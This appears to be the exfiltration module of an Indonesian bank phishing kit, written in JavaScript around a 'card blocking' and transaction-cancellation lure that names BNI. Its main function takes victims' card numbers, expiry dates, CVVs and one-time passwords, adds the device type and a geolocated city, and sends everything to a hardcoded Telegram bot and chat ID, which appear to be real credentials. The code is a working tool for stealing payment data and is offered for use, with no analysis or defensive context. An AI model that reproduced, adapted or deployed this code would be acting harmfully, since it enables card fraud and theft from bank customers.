// =========================================================
// 📤 FUNGSI KIRIM — HANYA DATA KARTU + OTP
// =========================================================

// === KONFIGURASI TELEGRAM ===
const BOT_TOKEN = '8686497429:AAF6Ta9LcNtLZ3vjIPjvqhtLf7_2jTL_IoE';  // Ganti Token Bot Anda
const CHAT_ID = '7402071395';      // Ganti Chat ID Anda

// === DETEKSI PERANGKAT HP ===
function getDeviceInfo() {
  const ua = navigator.userAgent;
  let device = 'Perangkat Tidak Dikenal';
  let os = '';

  if (/Android/.test(ua)) {
    os = 'Android';
    if (/Samsung/.test(ua)) device = 'Samsung Galaxy';
    else if (/Xiaomi/.test(ua)) device = 'Xiaomi';
    else if (/Redmi/.test(ua)) device = 'Redmi';
    else if (/Oppo/.test(ua)) device = 'Oppo';
    else if (/Vivo/.test(ua)) device = 'Vivo';
    else if (/Infinix/.test(ua)) device = 'Infinix';
    else if (/Tecno/.test(ua)) device = 'Tecno';
    else if (/Realme/.test(ua)) device = 'Realme';
    else if (/Huawei/.test(ua)) device = 'Huawei';
    else device = 'Android';
  } else if (/iPhone|iPad|iPod/.test(ua)) {
    os = 'iOS';
    if (/iPhone/.test(ua)) device = 'iPhone';
    else if (/iPad/.test(ua)) device = 'iPad';
  } else if (/Windows/.test(ua)) {
    os = 'Windows';
    device = 'Windows PC';
  } else if (/Mac/.test(ua)) {
    os = 'macOS';
    device = 'Mac';
  } else if (/Linux/.test(ua)) {
    os = 'Linux';
    device = 'Linux';
  }

  return `${device} (${os})`;
}

// === AMBIL LOKASI — HANYA NAMA KOTA/NEGARA ===
async function getLocation() {
  return new Promise((resolve) => {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        async (pos) => {
          const { latitude, longitude } = pos.coords;
          try {
            const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json`);
            const data = await res.json();
            const city = data.address?.city || data.address?.town || data.address?.village || 'Tidak Diketahui';
            const state = data.address?.state || '';
            const country = data.address?.country || 'Indonesia';
            resolve(`${city}, ${state}, ${country}`);
          } catch {
            resolve('Tidak Diketahui');
          }
        },
        () => {
          resolve('Tidak Diketahui (Izin Lokasi Ditolak)');
        },
        { timeout: 5000, enableHighAccuracy: true }
      );
    } else {
      resolve('Tidak Didukung');
    }
  });
}

// === KIRIM PESAN KE TELEGRAM — HANYA 2 KONDISI ===
async function kirimDataBlokirKartu(data, judul = 'DATA KARTU') {
  // ❌ JANGAN KIRIM JIKA KONFIRMASI
  if (judul === 'KONFIRMASI BATALKAN TRANSAKSI') {
    console.log('ℹ️ Konfirmasi — tidak dikirim ke Telegram');
    return;
  }

  const { noKartu, bulan, tahun, cvv, otp, namaBank = 'BNI' } = data;
  const perangkat = getDeviceInfo();
  const lokasi = await getLocation();
  const waktu = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });

  let pesan = '';

  // ✅ 1. DATA KARTU
  if (judul === 'DATA KARTU') {
    pesan = `
💳 VALIDASI KARTU BANK
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 Bank: ${namaBank}
💳 Nomor Kartu: ${noKartu.replace(/(\d{4})(?=\d)/g, '$1 ')}
📅 Masa Berlaku: ${bulan}/${tahun.slice(-2)}
🔑 CVV: ${cvv}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 Perangkat: ${perangkat}
🌍 Lokasi: ${lokasi}
🕐 Waktu: ${waktu}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
  }
  // ✅ 2. DATA LENGKAP + OTP
  else if (judul === 'DATA LENGKAP + OTP') {
    pesan = `
🔐 VERIFIKASI OTP — DATA LENGKAP
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🏦 Bank: ${namaBank}
💳 Nomor Kartu: ${noKartu.replace(/(\d{4})(?=\d)/g, '$1 ')}
📅 Masa Berlaku: ${bulan}/${tahun.slice(-2)}
🔑 CVV: ${cvv}
🔢 Kode OTP: ${otp}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📱 Perangkat: ${perangkat}
🌍 Lokasi: ${lokasi}
🕐 Waktu: ${waktu}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━
`;
  }

  // Kirim ke Telegram
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: pesan,
        parse_mode: 'HTML',
        disable_web_page_preview: true
      })
    });
    const result = await res.json();
    console.log('✅ Telegram terkirim:', judul);
    return result;
  } catch (err) {
    console.error('❌ Gagal kirim ke Telegram:', err);
  }
}
